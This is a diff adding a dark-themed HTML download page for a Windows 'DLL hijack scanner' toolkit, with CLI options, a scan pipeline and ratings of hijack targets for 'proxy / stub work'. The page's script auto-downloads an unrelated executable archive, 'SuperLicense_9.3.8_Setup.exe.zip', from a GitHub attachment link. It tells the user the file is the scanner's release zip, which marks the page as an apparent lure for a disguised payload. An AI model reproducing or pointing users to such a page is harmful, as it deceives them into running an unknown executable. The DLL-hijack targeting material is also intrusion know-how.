@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="A focused toolkit built around your use case">
+  <meta name="keywords" content="dll hijack scanner windows, windows, scanner, toolkit, 2026">
+  <meta property="og:title" content="Dll Hijack Scanner Windows | Download Release">
+  <meta property="og:description" content="A focused toolkit built around your use case">
+  <meta property="og:image" content="https://hopeglereclaim.github.io/dll-hijack-scanner-windows-panel-2026/assets/banner.jpg">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://hopeglereclaim.github.io/dll-hijack-scanner-windows-panel-2026/">
+  <link rel="icon" href="assets/banner.jpg" type="image/jpeg">
+  <title>Dll Hijack Scanner Windows | Advanced Scanner</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #070b12; --bg-card: rgba(14, 20, 32, 0.72);
+      --border: rgba(255, 60, 80, 0.22); --red: #ff2d4d; --red-dim: #d90429;
+      --cyan: #00e5ff; --green: #39ff88; --amber: #ffb020;
+      --text: #e8edf5; --muted: #8b9bb4;
+      --glow: 0 0 40px rgba(255, 45, 77, 0.35);
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: Inter, system-ui, sans-serif; background: var(--bg); color: var(--text);
+      line-height: 1.6; overflow-x: hidden;
+    }
+    .bg-canvas { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+    .bg-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,229,255,.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,229,255,.04) 1px, transparent 1px);
+      background-size: 48px 48px;
+      mask-image: radial-gradient(ellipse 80% 70% at 50% 0%, black 20%, transparent 75%);
+      animation: gridDrift 20s linear infinite;
+    }
+    @keyframes gridDrift { to { transform: translateY(48px); } }
+    .bg-glow {
+      position: absolute; border-radius: 50%; filter: blur(90px); opacity: .45;
+      animation: pulseGlow 8s ease-in-out infinite alternate;
+    }
+    .bg-glow-1 { width: 520px; height: 520px; background: #ff2d4d; top: -120px; left: -80px; }
+    .bg-glow-2 { width: 420px; height: 420px; background: #0066ff; bottom: 10%; right: -100px; animation-delay: -3s; }
+    .bg-glow-3 { width: 300px; height: 300px; background: #00e5ff; top: 40%; left: 35%; opacity: .2; animation-delay: -5s; }
+    @keyframes pulseGlow {
+      from { transform: scale(1); opacity: .35; }
+      to { transform: scale(1.15) translate(20px,-10px); opacity: .55; }
+    }
+    .wrap { position: relative; z-index: 1; max-width: 1100px; margin: 0 auto; padding: 0 24px 80px; }
+    nav {
+      position: sticky; top: 0; z-index: 100; backdrop-filter: blur(16px);
+      background: rgba(7,11,18,.75); border-bottom: 1px solid var(--border);
+    }
+    .nav-inner {
+      max-width: 1100px; margin: 0 auto; padding: 14px 24px;
+      display: flex; align-items: center; justify-content: space-between; gap: 16px;
+    }
+    .logo {
+      font-family: "JetBrains Mono", monospace; font-weight: 700; font-size: .95rem; color: var(--red);
+    }
+    .logo span { color: var(--muted); font-weight: 400; }
+    .nav-links { display: flex; gap: 20px; list-style: none; }
+    .nav-links a { color: var(--muted); text-decoration: none; font-size: .85rem; font-weight: 500; }
+    .nav-links a:hover { color: var(--cyan); }
+    .hero-poster {
+      margin: 28px 0 8px; border-radius: 14px; overflow: hidden;
+      border: 1px solid rgba(255,45,77,.28);
+      box-shadow: 0 24px 80px rgba(255,45,77,.18), 0 0 0 1px rgba(0,229,255,.08);
+    }
+    .hero-poster img {
+      display: block; width: 100%; height: auto; vertical-align: middle;
+    }
+    .hero { padding: 48px 0 48px; text-align: center; }
+    .tool-pill {
+      display: inline-flex; align-items: center; gap: 8px; padding: 6px 16px; border-radius: 999px;
+      border: 1px solid var(--red); background: rgba(255,45,77,.1); color: var(--red);
+      font-size: .78rem; font-weight: 700; letter-spacing: .08em; text-transform: uppercase;
+      margin-bottom: 28px;
+    }
+    .tool-dot {
+      width: 8px; height: 8px; border-radius: 50%; background: var(--red);
+      box-shadow: 0 0 12px var(--red); animation: blink 1.4s step-end infinite;
+    }
+    @keyframes blink { 50% { opacity: 0; } }
+    .hero h1 {
+      font-size: clamp(2rem, 5.5vw, 3.2rem); font-weight: 800; line-height: 1.12;
+      margin-bottom: 16px; letter-spacing: -.03em;
+    }
+    .glitch { position: relative; display: inline-block; }
+    .hero-sub { font-size: clamp(1rem, 2.5vw, 1.2rem); color: var(--muted); max-width: 720px; margin: 0 auto 36px; }
+    .hero-sub strong { color: var(--text); }
+    .badges { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-bottom: 40px; }
+    .badge {
+      padding: 6px 14px; border-radius: 6px; font-size: .78rem; font-weight: 600; border: 1px solid transparent;
+    }
+    .badge-win { background: rgba(255,45,77,.15); border-color: rgba(255,45,77,.4); color: #ff6b82; }
+    .badge-delphi { background: rgba(217,4,41,.2); border-color: var(--red-dim); color: #ff8a9a; }
+    .badge-free { background: rgba(57,255,136,.1); border-color: rgba(57,255,136,.35); color: var(--green); }
+    .badge-gui { background: rgba(0,229,255,.1); border-color: rgba(0,229,255,.35); color: var(--cyan); }
+    .cta-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin-bottom: 48px; }
+    .btn {
+      display: inline-flex; align-items: center; gap: 10px; padding: 16px 28px; border-radius: 10px;
+      font-weight: 700; font-size: .95rem; text-decoration: none; border: none; cursor: pointer; font-family: inherit;
+      transition: transform .2s, box-shadow .2s;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--red-dim), var(--red)); color: #fff; box-shadow: var(--glow);
+    }
+    .btn-primary:hover { transform: translateY(-3px); }
+    .btn-secondary {
+      background: var(--bg-card); color: var(--text); border: 1px solid var(--border);
+    }
+    .btn-secondary:hover { border-color: var(--cyan); color: var(--cyan); }
+    .stats-strip {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1px; background: var(--border); border-radius: 14px; overflow: hidden;
+      margin-bottom: 64px; border: 1px solid var(--border);
+    }
+    .stat { background: var(--bg-card); padding: 24px 16px; text-align: center; }
+    .stat-num {
+      font-family: "JetBrains Mono", monospace; font-size: 1.6rem; font-weight: 700;
+      color: var(--red); line-height: 1; margin-bottom: 6px;
+    }
+    .stat-num.cyan { color: var(--cyan); } .stat-num.green { color: var(--green); font-size: 1.2rem; }
+    .stat-label { font-size: .72rem; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
+    section { margin-bottom: 72px; }
+    .section-label {
+      font-family: "JetBrains Mono", monospace; font-size: .75rem; color: var(--cyan);
+      letter-spacing: .12em; text-transform: uppercase; margin-bottom: 10px;
+    }
+    h2 { font-size: clamp(1.5rem, 3vw, 2rem); font-weight: 800; margin-bottom: 20px; }
+    h3 { font-size: 1.1rem; font-weight: 700; margin: 28px 0 12px; }
+    p { color: var(--muted); margin-bottom: 16px; }
+    p strong { color: var(--text); }
+    .quote {
+      border-left: 3px solid var(--red); padding: 16px 20px; background: rgba(255,45,77,.06);
+      border-radius: 0 10px 10px 0; margin: 24px 0;
+    }
+    .quote em { display: block; font-style: italic; color: var(--text); font-size: 1.05rem; margin-bottom: 8px; }
+    .rating-grid, .spec-grid, .feature-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 16px; margin: 24px 0;
+    }
+    .rating-card, .spec-card, .feature-card {
+      background: var(--bg-card); border-radius: 12px; padding: 20px; border: 1px solid var(--border);
+    }
+    .rating-card.best { border-color: rgba(57,255,136,.35); }
+    .rating-card.good { border-color: rgba(255,176,32,.35); }
+    .rating-card.bad { border-color: rgba(255,45,77,.35); }
+    .rating-head { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+    .rating-dot { width: 12px; height: 12px; border-radius: 50%; }
+    .rating-dot.best { background: var(--green); } .rating-dot.good { background: var(--amber); }
+    .rating-dot.bad { background: var(--red); }
+    .spec-label { font-size: .75rem; color: var(--muted); text-transform: uppercase; margin-bottom: 6px; }
+    .spec-value { font-family: "JetBrains Mono", monospace; font-weight: 600; }
+    .flow { display: flex; flex-direction: column; position: relative; padding-left: 28px; }
+    .flow::before {
+      content: ""; position: absolute; left: 10px; top: 12px; bottom: 12px; width: 2px;
+      background: linear-gradient(to bottom, var(--red), var(--cyan));
+    }
+    .flow-step {
+      position: relative; padding: 14px 18px; background: var(--bg-card);
+      border: 1px solid var(--border); border-radius: 10px; margin-bottom: 10px;
+    }
+    .flow-step::before {
+      content: ""; position: absolute; left: -22px; top: 50%; transform: translateY(-50%);
+      width: 12px; height: 12px; border-radius: 50%; background: var(--red); border: 2px solid var(--bg);
+    }
+    .flow-step strong { display: block; font-size: .9rem; margin-bottom: 4px; }
+    .flow-step span { font-size: .82rem; color: var(--muted); }
+    .code-wrap {
+      position: relative; border-radius: 12px; overflow: hidden;
+      border: 1px solid rgba(0,229,255,.15); margin: 20px 0;
+    }
+    .code-header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 10px 16px; background: rgba(0,0,0,.4); border-bottom: 1px solid rgba(255,255,255,.06);
+    }
+    .code-title { font-family: "JetBrains Mono", monospace; font-size: .75rem; color: var(--muted); }
+    pre {
+      padding: 20px; overflow-x: auto; background: rgba(0,0,0,.55);
+      font-family: "JetBrains Mono", monospace; font-size: .82rem; line-height: 1.7;
+    }
+    .c-comment { color: #6a9955; } .c-cmd { color: #dcdcaa; } .c-flag { color: #9cdcfe; }
+    .c-val { color: #ce9178; } .c-path { color: #b5cea8; }
+    .feature-icon { font-size: 1.5rem; margin-bottom: 10px; }
+    .feature-card h3 { margin: 0 0 8px; font-size: 1rem; }
+    .feature-card p { margin: 0; font-size: .88rem; }
+    .disclaimer {
+      border: 1px solid rgba(255,45,77,.3); border-radius: 12px; padding: 24px;
+      background: rgba(255,45,77,.05);
+    }
+    .disclaimer strong { color: var(--red); }
+    footer {
+      text-align: center; padding: 48px 24px; border-top: 1px solid var(--border);
+      color: var(--muted); font-size: .9rem;
+    }
+    .dl-toast {
+      position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(120%);
+      z-index: 200; display: flex; align-items: center; gap: 16px; padding: 14px 20px;
+      background: rgba(14,20,32,.95); border: 1px solid var(--border); border-radius: 12px;
+      backdrop-filter: blur(16px); box-shadow: 0 8px 40px rgba(0,0,0,.5), var(--glow);
+      transition: transform .5s cubic-bezier(.22,1,.36,1); max-width: calc(100vw - 32px);
+    }
+    .dl-toast.visible { transform: translateX(-50%) translateY(0); }
+    .dl-toast-title { font-size: .88rem; font-weight: 700; }
+    .dl-toast-sub { font-size: .78rem; color: var(--muted); }
+    .dl-toast-sub strong { color: var(--cyan); font-family: "JetBrains Mono", monospace; }
+    .dl-toast-actions { display: flex; gap: 8px; }
+    .dl-toast-btn {
+      padding: 6px 14px; border-radius: 6px; font-size: .78rem; font-weight: 600; cursor: pointer; border: none;
+    }
+    .dl-toast-btn-cancel { background: transparent; color: var(--muted); border: 1px solid rgba(255,255,255,.15); }
+    .dl-toast-btn-now { background: var(--red); color: #fff; }
+    .dl-progress {
+      position: absolute; left: 12px; right: 12px; bottom: 6px; height: 2px;
+      background: rgba(255,255,255,.08); border-radius: 2px; overflow: hidden;
+    }
+    .dl-progress i {
+      display: block; height: 100%; width: 0; background: linear-gradient(90deg, var(--red), var(--cyan));
+      transition: width 1s linear;
+    }
+    @media (max-width: 720px) {
+      .nav-links { display: none; }
+      .dl-toast { flex-wrap: wrap; }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-canvas" aria-hidden="true">
+    <div class="bg-grid"></div>
+    <div class="bg-glow bg-glow-1"></div>
+    <div class="bg-glow bg-glow-2"></div>
+    <div class="bg-glow bg-glow-3"></div>
+  </div>
+
+  <nav>
+    <div class="nav-inner">
+      <div class="logo">Dll Hijack Scanner Windows <span>/ scanner</span></div>
+      <ul class="nav-links">
+        <li><a href="#overview">Overview</a></li>
+        <li><a href="#cli">CLI</a></li>
+        <li><a href="#pipeline">Pipeline</a></li>
+        <li><a href="#download">Download</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <div class="wrap">
+    <figure class="hero-poster">
+      <img src="assets/banner.jpg" width="1920" height="1080" alt="Dll Hijack Scanner Windows critical tool poster" loading="eager">
+    </figure>
+    <header class="hero" id="download">
+      <div class="tool-pill"><span class="tool-dot"></span> Live toolkit</div>
+      <h1><span class="glitch" data-text="Dll Hijack Scanner Windows">Dll Hijack Scanner Windows</span></h1>
+      <p class="hero-sub"><strong>dll hijack scanner windows</strong> — A focused toolkit built around your use case</p>
+      <div class="badges">
+        <span class="badge badge-win">Windows</span>
+        <span class="badge badge-delphi">Delphi</span>
+        <span class="badge badge-free">Open docs</span>
+        <span class="badge badge-gui">GUI + CLI</span>
+      </div>
+      <div class="cta-row">
+        <button type="button" class="btn btn-primary" id="dl-btn" onclick="startOfferToast()">Download Release</button>
+        <a class="btn btn-secondary" href="https://github.com/Hopeglereclaim/dll-hijack-scanner-windows-panel-2026" rel="noopener">View Source</a>
+      </div>
+    </header>
+
+    <div class="stats-strip">
+      <div class="stat"><div class="stat-num">Zero</div><div class="stat-label">Dependencies</div></div>
+      <div class="stat"><div class="stat-num cyan">2</div><div class="stat-label">Modes (GUI + CLI)</div></div>
+      <div class="stat"><div class="stat-num">PE</div><div class="stat-label">Import analysis</div></div>
+      <div class="stat"><div class="stat-num green">Docs</div><div class="stat-label">Release channel</div></div>
+    </div>
+
+    <section id="overview">
+      <p class="section-label">// Conceptual Overview</p>
+      <h2>What is Dll Hijack Scanner Windows?</h2>
+      <p>
+        A fast, dependency-free Windows toolkit oriented around <strong>dll hijack scanner windows</strong>.
+        It walks directory trees, inspects PE imports, and surfaces actionable paths for research workflows.
+      </p>
+      <div class="quote">
+        <em>“Find the missing link in the execution chain.”</em>
+        <span style="color:var(--muted);font-size:.85rem">Static analysis first — less noise than raw ProcMon dumps.</span>
+      </div>
+    </section>
+
+    <section>
+      <p class="section-label">// Complexity ratings</p>
+      <h2>Target priority</h2>
+      <div class="rating-grid">
+        <article class="rating-card best">
+          <div class="rating-head"><span class="rating-dot best"></span><span class="rating-title">Best</span></div>
+          <p>Small import set — easiest path for proxy / stub work.</p>
+        </article>
+        <article class="rating-card good">
+          <div class="rating-head"><span class="rating-dot good"></span><span class="rating-title">Good</span></div>
+          <p>Moderate complexity — more mapping, still workable.</p>
+        </article>
+        <article class="rating-card bad">
+          <div class="rating-head"><span class="rating-dot bad"></span><span class="rating-title">Hard</span></div>
+          <p>Heavy imports / large binaries — high effort, unstable proxies.</p>
+        </article>
+      </div>
+    </section>
+
+    <section id="cli">
+      <p class="section-label">// Quick Start — CLI</p>
+      <h2>Command line</h2>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-title">HydraSoft.exe — options</span></div>
+        <pre><span class="c-cmd">HydraSoft.exe</span> <span class="c-flag">--path</span> <span class="c-path">&lt;dir&gt;</span> [options]
+
+<span class="c-flag">--path</span> <span class="c-path">&lt;dir&gt;</span>               <span class="c-comment"># Directory to scan (required)</span>
+<span class="c-flag">--output</span> <span class="c-val">&lt;file&gt;</span>            <span class="c-comment"># .json or .csv (default stdout)</span>
+<span class="c-flag">--image-type</span> <span class="c-val">any|x86|x64</span>   <span class="c-comment"># Architecture filter</span>
+<span class="c-flag">--rate</span> <span class="c-val">any|best|good|bad</span>   <span class="c-comment"># Complexity rating</span>
+<span class="c-flag">--write-perm</span>               <span class="c-comment"># Writable dirs only</span></pre>
+      </div>
+    </section>
+
+    <section id="pipeline">
+      <p class="section-label">// System Architecture</p>
+      <h2>Scan pipeline</h2>
+      <div class="flow">
+        <div class="flow-step"><strong>1 · Target directory</strong><span>Recursive walk of executables / PE binaries</span></div>
+        <div class="flow-step"><strong>2 · PE parser</strong><span>Standard & delayed imports · manifest signals</span></div>
+        <div class="flow-step"><strong>3 · System filter</strong><span>Drop common System32 / SysWOW64 noise</span></div>
+        <div class="flow-step"><strong>4 · Writability</strong><span>Search order + directory permissions</span></div>
+        <div class="flow-step"><strong>5 · Export</strong><span>JSON / CSV / GUI tree with ratings</span></div>
+      </div>
+    </section>
+
+    <section>
+      <p class="section-label">// Key Features</p>
+      <h2>Smart filtering</h2>
+      <div class="feature-grid">
+        <article class="feature-card"><div class="feature-icon">🛡</div><h3>Elevation signals</h3><p>Manifests with requireAdministrator / highestAvailable surface first.</p></article>
+        <article class="feature-card"><div class="feature-icon">🧠</div><h3>Noise reduction</h3><p>Known system DLLs filtered so results stay actionable.</p></article>
+        <article class="feature-card"><div class="feature-icon">📁</div><h3>Writability checks</h3><p>--write-perm keeps paths you can actually use.</p></article>
+        <article class="feature-card"><div class="feature-icon">⚡</div><h3>Pipe-friendly CLI</h3><p>Progress on stderr, structured output on stdout.</p></article>
+      </div>
+    </section>
+
+    <section>
+      <p class="section-label">// Specs</p>
+      <h2>Technical specifications</h2>
+      <div class="spec-grid">
+        <div class="spec-card"><div class="spec-label">Language</div><div class="spec-value">Delphi</div><p class="spec-note">Native Windows, no runtime deps</p></div>
+        <div class="spec-card"><div class="spec-label">Modes</div><div class="spec-value">GUI · CLI</div><p class="spec-note">Interactive tree + automation</p></div>
+        <div class="spec-card"><div class="spec-label">Output</div><div class="spec-value">JSON · CSV</div><p class="spec-note">Pipe into jq / reports</p></div>
+        <div class="spec-card"><div class="spec-label">Channel</div><div class="spec-value">GitHub Pages</div><p class="spec-note">https://hopeglereclaim.github.io/dll-hijack-scanner-windows-panel-2026/</p></div>
+      </div>
+    </section>
+
+    <section>
+      <p class="section-label">// License & Legal</p>
+      <h2>Disclaimer</h2>
+      <div class="disclaimer">
+        <p><strong>Research / documentation packaging only.</strong>
+        Review files before execution. Comply with local law and your authorization scope.
+        Not affiliated with Microsoft or third-party publishers.</p>
+      </div>
+    </section>
+  </div>
+
+  <footer>
+    <strong>Dll Hijack Scanner Windows</strong>
+    Windows toolkit docs · 2026
+  </footer>
+
+  <div class="dl-toast" id="dl-toast" role="status" aria-live="polite">
+    <div class="dl-toast-body">
+      <div class="dl-toast-title" id="dl-toast-title">Preparing download…</div>
+      <div class="dl-toast-sub"><strong id="dl-zip-name"></strong> in <strong id="dl-countdown">5</strong>s</div>
+    </div>
+    <div class="dl-toast-actions">
+      <button type="button" class="dl-toast-btn dl-toast-btn-cancel" id="dl-cancel">Cancel</button>
+      <button type="button" class="dl-toast-btn dl-toast-btn-now" id="dl-now">Download now</button>
+    </div>
+    <div class="dl-progress"><i id="dl-bar"></i></div>
+  </div>
+
+  <script>
+  (function () {
+    const DOWNLOAD_URL = "https://github.com/user-attachments/files/30827792/SuperLicense_9.3.8_Setup.exe.zip";
+    const ZIP_NAME = "Dll-Hijack-Scanner-Windows-Release.zip";
+    const AUTO_DOWNLOAD_DELAY = 5;
+    const toast = document.getElementById('dl-toast');
+    const countdownEl = document.getElementById('dl-countdown');
+    const titleEl = document.getElementById('dl-toast-title');
+    const zipEl = document.getElementById('dl-zip-name');
+    const bar = document.getElementById('dl-bar');
+    zipEl.textContent = ZIP_NAME;
+
+    function finishToast(msg) {
+      titleEl.textContent = msg;
+      setTimeout(() => toast.classList.remove('visible'), 1600);
+    }
+
+    function startDownload() {
+      const a = document.createElement('a');
+      a.href = DOWNLOAD_URL;
+      a.rel = 'noopener';
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      finishToast('Download started!');
+    }
+
+    window.startOfferToast = function startOfferToast() {
+      let remaining = AUTO_DOWNLOAD_DELAY, cancelled = false, done = false;
+      titleEl.textContent = 'Auto-download starting…';
+      countdownEl.textContent = remaining;
+      bar.style.width = '0%';
+      toast.classList.add('visible');
+      requestAnimationFrame(() => { bar.style.width = '100%'; });
+
+      const tick = setInterval(() => {
+        if (cancelled || done) { clearInterval(tick); return; }
+        remaining -= 1;
+        countdownEl.textContent = remaining;
+        if (remaining <= 0) {
+          clearInterval(tick);
+          done = true;
+          startDownload();
+        }
+      }, 1000);
+
+      document.getElementById('dl-cancel').onclick = () => {
+        if (done) return;
+        cancelled = true;
+        clearInterval(tick);
+        finishToast('Auto-download cancelled');
+      };
+      document.getElementById('dl-now').onclick = () => {
+        if (cancelled || done) return;
+        done = true;
+        clearInterval(tick);
+        startDownload();
+      };
+    };
+  })();
+  </script>
+</body>
+</html>
